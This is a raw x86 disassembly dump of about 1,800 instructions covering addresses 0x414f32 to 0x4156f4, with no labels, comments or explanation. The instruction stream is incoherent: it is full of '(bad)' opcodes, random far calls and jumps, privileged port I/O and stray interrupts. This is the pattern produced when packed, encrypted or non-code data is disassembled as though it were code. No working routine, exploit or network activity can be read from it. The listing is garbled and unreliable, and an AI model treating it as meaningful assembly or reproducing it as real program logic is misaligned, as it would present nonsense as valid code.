  414f32:	pop    ebx
  414f33:	pushf  
  414f34:	sub    al,0x26
  414f36:	loopne 0x414f0d
  414f38:	les    edi,FWORD PTR [eax]
  414f3a:	call   0x26b47dc
  414f3f:	sbb    ecx,eax
  414f41:	retf   
  414f42:	enter  0xf75f,0x53
  414f46:	int    0x82
  414f48:	int    0xe9
  414f4a:	retf   
  414f4b:	sub    bh,BYTE PTR [ecx]
  414f4d:	jae    0x414fa9
  414f4f:	in     eax,0x60
  414f51:	inc    ecx
  414f52:	inc    ebp
  414f53:	inc    esi
  414f54:	mov    ebp,0xb3b52721
  414f59:	es push eax
  414f5b:	adc    al,0xf9
  414f5d:	mov    ch,0xca
  414f5f:	adc    cl,ah
  414f61:	adc    bl,BYTE PTR [edx+0x656d8d80]
  414f67:	jp     0x414f0c
  414f69:	cmc    
  414f6a:	pop    es
  414f6b:	fwait
  414f6c:	xor    esp,DWORD PTR [ecx]
  414f6e:	mov    cl,0xe5
  414f70:	fs repz cld 
  414f73:	push   edi
  414f74:	add    bl,cl
  414f76:	push   ebp
  414f77:	sbb    al,0x20
  414f79:	xchg   edi,eax
  414f7a:	mov    dh,BYTE PTR [esi]
  414f7c:	cli    
  414f7d:	pmaddwd mm6,mm6
  414f80:	pop    ebp
  414f81:	push   ss
  414f82:	fs dec edx
  414f84:	call   0xac0f:0xf838b9ea
  414f8b:	loop   0x414f70
  414f8d:	ss inc edi
  414f8f:	stc    
  414f90:	(bad)  
  414f91:	cli    
  414f92:	add    ah,ch
  414f94:	enter  0x1935,0xa9
  414f98:	mov    ah,0xf
  414f9a:	sbb    edi,DWORD PTR [esi]
  414f9c:	pop    edx
  414f9d:	fwait
  414f9e:	(bad)  
  414f9f:	adc    BYTE PTR [esi-0x533222c],bh
  414fa5:	cmp    cl,BYTE PTR [ecx]
  414fa7:	retf   
  414fa8:	mov    cl,0xa4
  414faa:	mov    dl,0x61
  414fac:	xor    bl,BYTE PTR ds:0x3413001e
  414fb2:	loope  0x41500a
  414fb4:	xchg   ebx,eax
  414fb5:	mov    bh,0x15
  414fb7:	cdq    
  414fb8:	xchg   edx,eax
  414fb9:	xchg   esp,eax
  414fba:	or     eax,0xbe727dd5
  414fbf:	stc    
  414fc0:	sar    DWORD PTR [edx-0x2dacb7fa],0xc6
  414fc7:	mov    ebp,edi
  414fc9:	mov    ebp,0x7b1e7947
  414fce:	inc    esi
  414fcf:	ins    BYTE PTR es:[edi],dx
  414fd0:	popf   
  414fd1:	add    BYTE PTR [esi],ch
  414fd3:	dec    edx
  414fd4:	push   edi
  414fd5:	lahf   
  414fd6:	int    0x14
  414fd8:	sub    DWORD PTR [ecx],edx
  414fda:	outs   dx,DWORD PTR ds:[esi]
  414fdb:	inc    ecx
  414fdc:	sbb    eax,0xcc8d5fbc
  414fe1:	(bad)  
  414fe2:	dec    edi
  414fe3:	push   0x5c
  414fe5:	add    DWORD PTR [edx-0x7b],0xebe64103
  414fec:	test   BYTE PTR [ebx],bl
  414fee:	mov    eax,DWORD PTR [ebp-0x73]
  414ff1:	jns    0x414f98
  414ff3:	jno    0x414fb1
  414ff5:	push   ebx
  414ff6:	ret    
  414ff7:	mov    al,ds:0x43e8f525
  414ffc:	into   
  414ffd:	sub    al,0xf
  414fff:	ret    
  415000:	adc    BYTE PTR ds:0x9fa6effe,cl
  415006:	xchg   edx,eax
  415007:	mov    ebp,0x28f4f8d
  41500c:	add    esi,edx
  41500e:	add    DWORD PTR [edi+0x655a203f],0x37
  415015:	into   
  415016:	outs   dx,BYTE PTR ds:[esi]
  415017:	mov    dl,0x85
  415019:	cli    
  41501a:	and    eax,0x8dae786e
  41501f:	iret   
  415020:	daa    
  415021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415022:	shr    DWORD PTR [ebx-0x1c],1
  415025:	out    0x2f,eax
  415027:	jae    0x4150a1
  415029:	into   
  41502a:	xchg   esp,eax
  41502b:	mov    bl,0xd6
  41502d:	pop    ax
  41502f:	daa    
  415030:	sub    ebp,eax
  415032:	test   al,0x4d
  415034:	data16 (bad) 
  415036:	out    dx,eax
  415037:	add    esi,DWORD PTR [eax-0x59]
  41503a:	cs xchg esp,eax
  41503c:	imul   eax,esp,0x3f
  41503f:	push   esp
  415040:	adc    al,0xa2
  415042:	aad    0xd9
  415044:	ret    0x883b
  415047:	out    dx,al
  415048:	push   edi
  415049:	pop    ebx
  41504a:	mov    dl,0x9a
  41504c:	call   0x90c1b22b
  415051:	push   edi
  415052:	xchg   esp,eax
  415053:	dec    esi
  415054:	fnstsw WORD PTR [esi]
  415056:	adc    al,0x54
  415058:	or     edx,esp
  41505a:	adc    bl,BYTE PTR [eax-0x4179af67]
  415060:	es mov eax,0xbaeaca71
  415066:	div    DWORD PTR [esi]
  415068:	scas   al,BYTE PTR es:[edi]
  415069:	ds je  0x41509b
  41506c:	xor    al,0xb6
  41506e:	xor    eax,edx
  415070:	mov    ecx,0xb314fbf6
  415075:	loop   0x415096
  415077:	or     eax,0x111af6ea
  41507c:	lds    esp,FWORD PTR [ecx]
  41507e:	in     al,dx
  41507f:	into   
  415080:	inc    ebp
  415081:	pushf  
  415082:	jle    0x4150dc
  415084:	pop    ebx
  415085:	stos   BYTE PTR es:[edi],al
  415086:	xchg   DWORD PTR [esi-0x372fe04c],ebp
  41508c:	out    dx,eax
  41508d:	jp     0x41502f
  41508f:	xchg   ebx,eax
  415090:	mov    esp,0x98abba09
  415095:	lods   eax,DWORD PTR ds:[esi]
  415096:	cli    
  415097:	and    eax,0x5d6e2c9b
  41509c:	outs   dx,DWORD PTR ds:[esi]
  41509d:	sbb    BYTE PTR [ebx],ch
  41509f:	ja     0x415061
  4150a1:	hlt    
  4150a2:	cmp    eax,0x5862469e
  4150a7:	add    al,0x89
  4150a9:	imul   esp,esi,0xdb6ef96d
  4150af:	sti    
  4150b0:	jmp    0x4150ba
  4150b2:	call   0xa395701a
  4150b7:	jno    0x415128
  4150b9:	gs retf 
  4150bb:	xchg   ecx,eax
  4150bc:	ins    DWORD PTR es:[edi],dx
  4150bd:	cmp    edi,DWORD PTR [ecx]
  4150bf:	jl     0x41513d
  4150c1:	(bad)  
  4150c3:	mov    ecx,0x5f2b2ac4
  4150c8:	jno    0x415051
  4150ca:	mov    edx,0xb3c3caa3
  4150cf:	cdq    
  4150d0:	je     0x4150e1
  4150d2:	les    edi,FWORD PTR [edx]
  4150d4:	lock (bad) 
  4150d6:	mov    dl,0x30
  4150d8:	pop    ss
  4150d9:	pcmpeqb mm6,QWORD PTR [ecx]
  4150dc:	add    BYTE PTR [edi-0x22],bl
  4150df:	ins    BYTE PTR es:[edi],dx
  4150e0:	or     bh,BYTE PTR [edx+esi*2]
  4150e3:	add    edx,DWORD PTR [ebp-0x6a]
  4150e6:	xchg   DWORD PTR [ebx-0x29628d69],ebp
  4150ec:	icebp  
  4150ed:	sbb    al,0x51
  4150ef:	mov    dl,0x9a
  4150f1:	mov    BYTE PTR [ecx],al
  4150f3:	jle    0x41515c
  4150f5:	pop    ebp
  4150f6:	jmp    0x3b771271
  4150fb:	mov    bh,0x40
  4150fd:	dec    esi
  4150fe:	pop    ds
  4150ff:	imul   edx,esi,0x47
  415102:	in     al,0x3
  415104:	ja     0x415105
  415106:	pop    es
  415107:	inc    edi
  415108:	fild   QWORD PTR [esi+0xbd0a44b]
  41510e:	in     eax,0x17
  415110:	lds    esi,FWORD PTR [eax+edi*8]
  415113:	das    
  415114:	mov    dh,0x2c
  415116:	inc    DWORD PTR [ebx]
  415118:	xchg   ebx,eax
  415119:	inc    esi
  41511a:	fucomp st(4)
  41511c:	push   cs
  41511d:	mov    bl,0x10
  41511f:	sub    eax,0x78868261
  415124:	dec    edx
  415125:	ins    DWORD PTR es:[edi],dx
  415126:	fisttp WORD PTR [ecx+0x5e68adc9]
  41512c:	push   edi
  41512d:	daa    
  41512e:	lahf   
  41512f:	jmp    FWORD PTR [esi+0x660f8d17]
  415135:	push   cs
  415136:	mov    eax,ds:0x62dd5229
  41513b:	and    al,0xaf
  41513d:	bound  edx,QWORD PTR [edi-0x77188ecf]
  415143:	mul    ch
  415145:	sbb    bl,BYTE PTR [ebx]
  415147:	les    ebp,FWORD PTR [edi+eax*4+0x49]
  41514b:	repnz retf 
  41514d:	jbe    0x41511d
  41514f:	ins    DWORD PTR es:[edi],dx
  415150:	mov    es,WORD PTR [ecx]
  415152:	pop    ebp
  415153:	mov    edi,0xafe85a48
  415158:	ja     0x41518a
  41515a:	and    DWORD PTR [ecx],edx
  41515c:	cmp    dh,BYTE PTR [edi+0x7e04c3fa]
  415162:	xchg   BYTE PTR [eax-0x20],bh
  415165:	mov    DWORD PTR [ebp+0x6dd9570c],esi
  41516b:	pop    ebx
  41516c:	push   eax
  41516d:	inc    ebp
  41516e:	adc    BYTE PTR [ebp-0x34],dh
  415171:	js     0x4151df
  415173:	out    dx,al
  415174:	test   al,0x74
  415176:	adc    eax,0x1b4743f3
  41517b:	pop    ebx
  41517c:	push   0x3ac500d1
  415181:	inc    esi
  415182:	cmp    DWORD PTR [eax+edi*2+0x3d],edi
  415186:	cmp    eax,DWORD PTR [eax+0x91644c0]
  41518c:	push   cs
  41518d:	add    al,0x9a
  41518f:	inc    edi
  415190:	push   cs
  415191:	mov    dh,0xd3
  415193:	rol    bh,0x6f
  415196:	mov    dl,0x7f
  415198:	scas   eax,DWORD PTR es:[edi]
  415199:	das    
  41519a:	and    BYTE PTR [edi],ah
  41519c:	js     0x415200
  41519e:	mov    ds:0x22449160,al
  4151a3:	or     BYTE PTR ds:0xbc69006e,0xde
  4151aa:	retf   
  4151ab:	ins    DWORD PTR es:[edi],dx
  4151ac:	nop
  4151ad:	ja     0x415152
  4151af:	out    0x60,al
  4151b1:	sub    al,0x97
  4151b3:	(bad)  [edx-0x1b6d2d8b]
  4151b9:	fist   WORD PTR [eax-0x6]
  4151bc:	pop    edi
  4151bd:	jae    0x41523d
  4151bf:	fwait
  4151c0:	jecxz  0x4151d1
  4151c2:	push   esi
  4151c3:	into   
  4151c4:	mov    BYTE PTR [esi+0x1],dh
  4151c7:	loope  0x4151bb
  4151c9:	pop    ebp
  4151ca:	loope  0x4151e8
  4151cc:	mov    al,0x23
  4151ce:	and    esi,DWORD PTR [ebx+eiz*2]
  4151d1:	pop    es
  4151d2:	cs inc ecx
  4151d4:	sub    edi,DWORD PTR fs:[ebp+0x36]
  4151d8:	mov    BYTE PTR [ecx],dl
  4151da:	sar    DWORD PTR [edx-0x412b14ed],0x9d
  4151e1:	push   esi
  4151e3:	xchg   esi,eax
  4151e4:	int3   
  4151e5:	push   ds
  4151e6:	in     al,dx
  4151e7:	jo     0x4151a0
  4151e9:	stmxcsr DWORD PTR [ecx]
  4151ec:	repz dec ebp
  4151ee:	fsubr  QWORD PTR [edi-0x4f]
  4151f1:	gs mov ah,dh
  4151f4:	xor    eax,0x20b80785
  4151f9:	retf   0x864f
  4151fc:	mov    eax,0x408fbbe6
  415201:	out    dx,eax
  415202:	punpckhwd mm1,QWORD PTR [eax+0x62ca640b]
  415209:	mov    cl,0x8a
  41520b:	loop   0x4151f9
  41520d:	cmp    DWORD PTR [ebx-0x5e],ebx
  415210:	in     eax,0x6e
  415212:	pop    edx
  415213:	mov    eax,esp
  415215:	mov    bl,0x6a
  415217:	rol    dl,0xb4
  41521a:	repz jae 0x41522e
  41521d:	fbld   TBYTE PTR [edi]
  41521f:	test   DWORD PTR [edi-0x6a1f3640],0xc31ee440
  415229:	add    eax,0x26ad7fef
  41522e:	in     eax,0xf0
  415230:	(bad)  
  415231:	ficomp DWORD PTR [ebp+0x7b]
  415234:	nop
  415235:	pop    ss
  415236:	lock or BYTE PTR [eax+0x7eea3a99],0x8b
  41523e:	or     al,0x53
  415240:	jge    0x415250
  415242:	pop    eax
  415243:	xor    DWORD PTR [ebx],ecx
  415245:	mov    BYTE PTR [eax+edx*4+0x56],dh
  415249:	mov    ds:0xcfa46b4,eax
  41524e:	mov    ds,WORD PTR [edi]
  415250:	into   
  415251:	mov    BYTE PTR [ecx-0x11],cl
  415254:	dec    esp
  415255:	and    edx,DWORD PTR [edi-0x78]
  415258:	push   ebx
  415259:	lock nop
  41525b:	jg     0x415223
  41525d:	aad    0x1c
  41525f:	je     0x415222
  415261:	sbb    BYTE PTR [edi+0x7e],0x41
  415265:	std    
  415266:	(bad)  
  415267:	in     al,dx
  415268:	nop
  415269:	pop    ebp
  41526a:	lahf   
  41526b:	es inc edx
  41526d:	jbe    0x415222
  41526f:	aam    0x39
  415271:	ss aad 0xd5
  415274:	enter  0x296c,0x7e
  415278:	das    
  415279:	jmp    0xb63e:0x5c2c369b
  415280:	jp     0x415239
  415282:	sbb    eax,DWORD PTR [edx]
  415284:	mov    cl,0xad
  415286:	mov    bh,0xc4
  415288:	pop    ebx
  415289:	add    BYTE PTR [edi-0x78],al
  41528c:	mov    WORD PTR [ebx],?
  41528e:	inc    esp
  41528f:	mov    ah,0x47
  415291:	sub    BYTE PTR [eax+0x7d84baae],0x25
  415298:	jo     0x41527b
  41529a:	add    eax,0xc5f93711
  41529f:	into   
  4152a0:	add    BYTE PTR [edi+eax*8+0xb],cl
  4152a4:	mov    al,BYTE PTR ds:0x5940fa12
  4152aa:	and    eax,DWORD PTR [ebx]
  4152ac:	sbb    edi,DWORD PTR [edi]
  4152ae:	(bad)  
  4152af:	dec    eax
  4152b0:	mov    ah,0x15
  4152b2:	out    dx,eax
  4152b3:	aad    0x12
  4152b5:	push   cs
  4152b6:	xor    DWORD PTR [edi-0x5a3dc],esp
  4152bc:	enter  0x4a0a,0xf3
  4152c0:	stos   DWORD PTR es:[edi],eax
  4152c1:	cmp    eax,0xafbd2164
  4152c6:	and    DWORD PTR [ebx+0x36e13ec],0xffffffc8
  4152cd:	cmp    al,0x6
  4152cf:	dec    esi
  4152d0:	aaa    
  4152d1:	xor    eax,0xfc3c241f
  4152d6:	pop    ds
  4152d7:	dec    edx
  4152d8:	push   ebp
  4152d9:	add    DWORD PTR fs:[ebp+0x70f2a116],ecx
  4152e0:	mov    al,BYTE PTR [ecx-0x2a]
  4152e3:	pop    ds
  4152e4:	pop    ecx
  4152e5:	add    DWORD PTR [esp+ebp*2+0x1c62a3e3],ecx
  4152ec:	test   eax,0x10181f22
  4152f1:	retf   
  4152f2:	pop    edi
  4152f3:	popf   
  4152f4:	ja     0x4152a9
  4152f6:	xchg   esi,eax
  4152f7:	fincstp 
  4152f9:	pop    ecx
  4152fa:	jne    0x415333
  4152fc:	dec    esp
  4152fd:	cmp    BYTE PTR [esi],ah
  4152ff:	pop    esp
  415300:	mov    edi,0xc3752153
  415305:	out    0x14,eax
  415307:	pop    eax
  415308:	push   ds
  415309:	inc    ebp
  41530a:	daa    
  41530b:	pop    eax
  41530c:	mov    bl,BYTE PTR [edx-0x3f3b8b09]
  415312:	jl     0x4152f5
  415314:	mov    ds:0xb77cb3d7,eax
  415319:	cwde   
  41531a:	enter  0x5c0c,0xec
  41531e:	div    BYTE PTR cs:[esi+0x1582368d]
  415325:	pop    ebx
  415326:	arpl   cx,bp
  415328:	cmp    BYTE PTR [ecx+0x7c],dl
  41532b:	pop    ds
  41532c:	mov    bh,0x3e
  41532e:	xlat   BYTE PTR ds:[ebx]
  41532f:	aaa    
  415330:	(bad)  
  415331:	lods   al,BYTE PTR ds:[esi]
  415332:	xor    DWORD PTR [esi],edx
  415334:	push   esp
  415335:	mov    edi,0x9fa7b01f
  41533a:	push   0xfffffff1
  41533c:	dec    esp
  41533d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41533e:	xor    BYTE PTR [esi],cl
  415340:	mov    DWORD PTR [edx],0xd60d78e3
  415346:	in     al,0x4f
  415348:	leave  
  415349:	pop    ebp
  41534a:	addr16 cpuid 
  41534d:	cmc    
  41534e:	adc    ah,BYTE PTR [si]
  415351:	mov    ebx,0x9a890115
  415356:	sbb    eax,0x8a6e009a
  41535b:	jns    0x41531d
  41535d:	pop    ecx
  41535e:	mov    al,ds:0xc70193d5
  415363:	test   DWORD PTR [ebx-0x2a],0xb3ab0d10
  41536a:	push   cs
  41536b:	xchg   esi,eax
  41536c:	in     al,0xb3
  41536e:	mov    ah,0xd7
  415370:	dec    edi
  415371:	je     0x41533d
  415373:	out    0x4,eax
  415375:	xor    BYTE PTR [eax],al
  415377:	mov    ch,0xb9
  415379:	sbb    eax,0xacbeda0b
  41537e:	repnz fnsave [esi+0x5d1b1654]
  415385:	sub    DWORD PTR [edi],ebp
  415387:	mov    edi,edi
  415389:	iret   
  41538a:	and    BYTE PTR [ebp-0xa],ah
  41538d:	ss ret 0x3718
  415391:	cmp    al,0xd5
  415393:	clc    
  415394:	push   esp
  415395:	out    0x14,eax
  415397:	cmc    
  415398:	push   cs
  415399:	mov    dh,0x7
  41539b:	test   BYTE PTR [edi+0x74183789],0xd4
  4153a2:	das    
  4153a3:	add    eax,0xd5eff6d5
  4153a8:	arpl   WORD PTR [edi-0x5bf1e70e],bx
  4153ae:	and    BYTE PTR [edx-0x67b74b20],bl
  4153b4:	jecxz  0x41541e
  4153b6:	mov    cl,0x55
  4153b8:	ret    0xb1dd
  4153bb:	jge    0x4153af
  4153bd:	aad    0x51
  4153bf:	lds    eax,FWORD PTR [edx]
  4153c1:	enter  0x2031,0xe5
  4153c5:	(bad)  
  4153c6:	call   0xd478:0xadcbbbd6
  4153cd:	jo     0x4153e5
  4153cf:	push   esi
  4153d0:	out    0x54,eax
  4153d2:	int    0x29
  4153d4:	rcr    edi,cl
  4153d6:	sub    dl,ch
  4153d8:	sti    
  4153d9:	mov    bl,bh
  4153db:	enter  0xe4ca,0x9c
  4153df:	fs in  eax,0x43
  4153e2:	daa    
  4153e3:	push   edi
  4153e4:	sar    DWORD PTR ds:0xcff71a14,0x24
  4153eb:	popf   
  4153ec:	or     al,0x45
  4153ee:	mov    BYTE PTR [ebx+eax*4+0x44],ah
  4153f2:	xor    eax,0x36193cdd
  4153f7:	dec    edi
  4153f8:	dec    edx
  4153f9:	mov    edi,ecx
  4153fb:	add    al,0x5
  4153fd:	mov    ecx,0xaa0a5649
  415402:	imul   eax,DWORD PTR [edx],0xffffff8a
  415405:	faddp  st(7),st
  415407:	call   0xa10e3d16
  41540c:	sbb    al,BYTE PTR [ebx+ecx*2-0x27a63ffc]
  415413:	out    0x93,al
  415415:	shr    BYTE PTR [edx+0x1a3dfe5],cl
  41541b:	mov    ah,0x3e
  41541d:	or     cl,BYTE PTR [edx-0x25]
  415420:	sub    eax,0xaeadd2f3
  415425:	jmp    0x939d4e34
  41542a:	jbe    0x415417
  41542c:	push   ebp
  41542d:	mov    fs,WORD PTR [ecx+0x73]
  415430:	sub    cl,BYTE PTR [eax]
  415432:	ret    
  415433:	int    0xcf
  415435:	adc    BYTE PTR [edi],dl
  415437:	xor    al,0x58
  415439:	xchg   ebx,eax
  41543a:	call   0x8541:0x98276347
  415441:	rcl    DWORD PTR [ecx],1
  415443:	xchg   ecx,eax
  415444:	mov    edx,0x73230ca5
  415449:	inc    esp
  41544a:	jl     0x415488
  41544c:	popf   
  41544d:	(bad)  
  41544e:	cmp    esi,edi
  415450:	mov    al,BYTE PTR [ebp+ebx*4+0x4a]
  415454:	sbb    BYTE PTR [ecx-0x61],dh
  415457:	lods   al,BYTE PTR ds:[esi]
  415458:	jp     0x415496
  41545a:	lea    edi,[esi+esi*8+0x7b]
  41545e:	sub    edx,DWORD PTR [edx-0x63]
  415461:	ret    0x849e
  415464:	idiv   DWORD PTR [ecx]
  415466:	jbe    0x4154b0
  415468:	in     eax,0x5f
  41546a:	mov    bh,0xa0
  41546c:	inc    edx
  41546d:	and    ebp,DWORD PTR [ecx-0x13]
  415470:	out    0x13,eax
  415472:	fisttp QWORD PTR [ebx+0x21879baa]
  415478:	and    edi,DWORD PTR [edx]
  41547a:	mov    esp,DWORD PTR [ecx+ebp*8-0x1bd43097]
  415481:	pop    ecx
  415482:	add    ebx,edi
  415484:	fisubr DWORD PTR [eax+0x21093e6d]
  41548a:	push   es
  41548b:	ins    DWORD PTR es:[edi],dx
  41548c:	ins    DWORD PTR es:[edi],dx
  41548d:	pop    edi
  41548e:	mov    ecx,0x7e9827e8
  415493:	or     bh,bl
  415495:	add    BYTE PTR [ecx],dl
  415497:	inc    edi
  415498:	stos   DWORD PTR es:[edi],eax
  415499:	js     0x415509
  41549b:	sub    DWORD PTR [eax],esi
  41549d:	gs cmp al,0xd0
  4154a0:	js     0x415513
  4154a2:	jae    0x415513
  4154a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154a5:	mov    bl,0x73
  4154a7:	outs   dx,BYTE PTR ds:[esi]
  4154a8:	aam    0x83
  4154aa:	dec    ecx
  4154ab:	setge  BYTE PTR [bp+di-0xd]
  4154b0:	popa   
  4154b1:	sti    
  4154b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154b3:	dec    esp
  4154b4:	retf   
  4154b5:	xor    bh,ch
  4154b7:	out    0xcb,al
  4154b9:	mov    ?,esi
  4154bb:	fist   DWORD PTR [ebx+0x2a]
  4154be:	pop    ss
  4154bf:	lock xor eax,0x46068604
  4154c5:	daa    
  4154c6:	retf   0x308f
  4154c9:	pop    edi
  4154ca:	mov    DWORD PTR [ecx-0x234ee10b],eax
  4154d0:	(bad)  
  4154d1:	or     al,0xbf
  4154d3:	dec    esp
  4154d4:	es jg  0x41553d
  4154d7:	add    DWORD PTR [ebx-0x3397c],ecx
  4154dd:	pop    ds
  4154de:	push   0xf49dbd71
  4154e3:	rcr    BYTE PTR [ecx],cl
  4154e5:	pop    ebp
  4154e6:	test   al,0x81
  4154e8:	fwait
  4154e9:	dec    esp
  4154ea:	sub    ch,BYTE PTR [ebx]
  4154ec:	mov    eax,0x7bb9e5f4
  4154f1:	ss dec ebp
  4154f3:	mov    ds:0x6e182677,eax
  4154f8:	mov    bl,BYTE PTR [ecx+0x12a2735e]
  4154fe:	cli    
  4154ff:	mov    BYTE PTR [ecx+ecx*4],al
  415502:	scas   eax,DWORD PTR es:[edi]
  415503:	mov    bh,0x59
  415505:	ret    
  415506:	(bad)  
  415507:	jbe    0x415578
  415509:	jmp    0x1163:0xeed24757
  415510:	dec    ebp
  415511:	loop   0x4154a7
  415513:	xor    eax,0xfe10f322
  415518:	cld    
  415519:	fs (bad) 
  41551c:	push   esp
  41551d:	aam    0x5c
  41551f:	jnp    0x415599
  415521:	aad    0xaf
  415523:	xchg   esi,eax
  415524:	fmul   st(1),st
  415526:	vpaddd xmm4,xmm2,XMMWORD PTR [ecx+ecx*4-0x16a958fa]
  41552f:	inc    esp
  415530:	cmp    al,0x8e
  415532:	loop   0x4154e3
  415534:	adc    eax,0x5f446958
  415539:	pushf  
  41553a:	inc    esp
  41553b:	add    ch,bh
  41553d:	seta   BYTE PTR [eax+esi*8-0x36]
  415542:	sub    al,0x31
  415544:	stos   BYTE PTR es:[edi],al
  415545:	loopne 0x4154cc
  415547:	push   ebp
  415548:	mov    dl,0x46
  41554a:	mov    cs,ebx
  41554c:	fistp  WORD PTR [ebp-0x1aca4175]
  415552:	mov    cl,0x41
  415554:	scas   eax,DWORD PTR es:[edi]
  415555:	dec    esp
  415556:	sub    dh,BYTE PTR [esi]
  415558:	sub    BYTE PTR [edx],0x74
  41555b:	sbb    al,ah
  41555d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41555e:	or     eax,DWORD PTR [ecx+0x4ef03787]
  415564:	leave  
  415565:	or     dh,bh
  415567:	sbb    cl,BYTE PTR [esi+0x59d57629]
  41556d:	sub    edi,DWORD PTR [ecx+0x2c]
  415570:	inc    ebx
  415571:	push   0xc2c811e9
  415576:	pop    esi
  415577:	imul   ebx,DWORD PTR [edx],0xffffffc4
  41557a:	cmp    DWORD PTR [esi+0x42],edi
  41557d:	jge    0x4155c2
  41557f:	or     edi,ebx
  415581:	sub    ah,cl
  415583:	push   ebp
  415584:	fs dec eax
  415586:	add    bh,BYTE PTR [edi]
  415588:	call   0xd38521fb
  41558d:	sub    al,cl
  41558f:	stc    
  415590:	cld    
  415591:	sti    
  415592:	clc    
  415593:	lahf   
  415594:	adc    dh,BYTE PTR [edi]
  415596:	pop    esi
  415597:	dec    edi
  415598:	or     ebx,DWORD PTR [ecx-0x4a993e77]
  41559e:	cmp    ch,BYTE PTR [eax+edi*8]
  4155a1:	je     0x4155a5
  4155a3:	addr16 push ds
  4155a5:	sbb    eax,0xa359e1ba
  4155aa:	pop    ecx
  4155ab:	sub    al,0x5
  4155ad:	rol    BYTE PTR [edx+0x4e],0xc8
  4155b1:	inc    ecx
  4155b2:	into   
  4155b3:	in     al,dx
  4155b4:	es daa 
  4155b6:	add    ebp,DWORD PTR [eax+0xb30cb88]
  4155bc:	or     ah,cl
  4155be:	xor    cl,ah
  4155c0:	pop    ecx
  4155c1:	sbb    eax,0x2e0c94c2
  4155c6:	pop    ss
  4155c7:	xor    edx,DWORD PTR [eax-0x4f14d04d]
  4155cd:	jae    0x4155de
  4155cf:	mov    ebx,0x74c23c6
  4155d4:	inc    DWORD PTR [edi-0x56e3635f]
  4155da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155db:	repz push ss
  4155dd:	jl     0x41564c
  4155df:	push   eax
  4155e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155e1:	sub    cl,dl
  4155e3:	sub    eax,0x12e48a1e
  4155e8:	adc    edi,DWORD PTR [eax]
  4155ea:	sbb    BYTE PTR [ebp+ebp*2-0x60],0x9d
  4155ef:	fnstsw WORD PTR [esi+0x33]
  4155f2:	mov    cl,0x22
  4155f4:	lock fwait
  4155f6:	daa    
  4155f7:	push   cs
  4155f8:	mov    ebx,0xaa770853
  4155fd:	je     0x4155cd
  4155ff:	imul   BYTE PTR [edi*1+0x384a723b]
  415606:	push   0xb92c4cb2
  41560b:	repnz and DWORD PTR [eax-0x5d],esp
  41560f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415610:	and    eax,DWORD PTR [ebx]
  415612:	jae    0x4155d1
  415614:	cld    
  415615:	cmp    dl,0x2d
  415618:	dec    esp
  415619:	sub    dh,BYTE PTR [eax+0x70]
  41561c:	mov    eax,ds:0xa3c024e
  415621:	xor    BYTE PTR [ecx-0x508a62a7],dl
  415627:	or     DWORD PTR [edx],eax
  415629:	(bad)  
  41562a:	push   eax
  41562b:	sbb    BYTE PTR [ebx-0x689c6b00],dl
  415631:	pop    ds
  415632:	jb     0x41566c
  415634:	sub    ah,BYTE PTR [edi+0x5]
  415637:	inc    ebx
  415638:	adc    al,0x95
  41563a:	aas    
  41563b:	and    eax,ebp
  41563d:	xor    eax,0x7ee03ac6
  415642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415643:	push   ebx
  415644:	adc    BYTE PTR [ebp-0x12353bf2],0x13
  41564b:	push   esp
  41564c:	inc    eax
  41564d:	in     eax,0xb2
  41564f:	push   eax
  415650:	loop   0x415669
  415652:	loope  0x415681
  415654:	adc    al,0x71
  415656:	jmp    0x4155e6
  415658:	test   eax,0x5bfb9132
  41565d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41565e:	repz mov eax,0x1e6b5037
  415664:	push   eax
  415665:	mov    al,ds:0xc86c1158
  41566a:	mov    ebp,0xe7fbab27
  41566f:	dec    ebp
  415670:	dec    ecx
  415671:	in     eax,0xf6
  415673:	(bad)  
  415674:	or     eax,0x1e64fb5b
  415679:	sub    al,ah
  41567b:	cmovl  eax,DWORD PTR [eax-0x20]
  41567f:	outs   dx,BYTE PTR ds:[esi]
  415680:	push   esp
  415681:	psllw  mm6,QWORD PTR [edx]
  415684:	cmp    BYTE PTR [ebp-0x52],dh
  415687:	in     eax,0xb1
  415689:	clc    
  41568a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41568b:	jo     0x41567e
  41568d:	in     eax,0x5e
  41568f:	out    0xc5,eax
  415691:	adc    al,BYTE PTR ds:0xacd26edf
  415697:	mov    esi,DWORD PTR [edi]
  415699:	jle    0x415661
  41569b:	mov    edi,DWORD PTR [ebx+edx*2]
  41569e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41569f:	sbb    dl,BYTE PTR [eax]
  4156a1:	mov    dh,0xaf
  4156a3:	jmp    0x928768b8
  4156a8:	mov    bl,0xe2
  4156aa:	mov    gs,WORD PTR [eax]
  4156ac:	sbb    BYTE PTR [edi+0x62],bl
  4156af:	out    0x1a,al
  4156b1:	inc    dh
  4156b3:	stc    
  4156b4:	xchg   edx,eax
  4156b5:	or     DWORD PTR [esi],ecx
  4156b7:	nop
  4156b8:	inc    esp
  4156b9:	jmp    0x4156ac
  4156bb:	pop    esi
  4156bc:	mov    esp,edx
  4156be:	pop    edx
  4156bf:	les    edi,FWORD PTR [eax-0x31]
  4156c2:	add    esi,DWORD PTR [ecx]
  4156c4:	not    DWORD PTR [esi-0x5901e62f]
  4156ca:	jl     0x4156ee
  4156cc:	cmc    
  4156cd:	xlat   BYTE PTR ds:[ebx]
  4156ce:	fstp   DWORD PTR [edi-0x6a]
  4156d1:	adc    BYTE PTR [ecx+0x2fb085d5],dh
  4156d7:	add    DWORD PTR [edx+edx*1-0x5e],0xffffffda
  4156dc:	sbb    DWORD PTR [edx-0x51],ecx
  4156df:	stos   DWORD PTR es:[edi],eax
  4156e0:	xor    eax,0xaddb3e98
  4156e5:	add    BYTE PTR [ecx+edx*2-0x6ee8dfa],cl
  4156ec:	out    dx,al
  4156ed:	pop    ebp
  4156ee:	and    BYTE PTR [edi],0x4a
  4156f1:	test   eax,ebx
  4156f3:	into   
  4156f4:	or     esi,DWORD PTR [edx+ebx*8+0x7b945e1a]
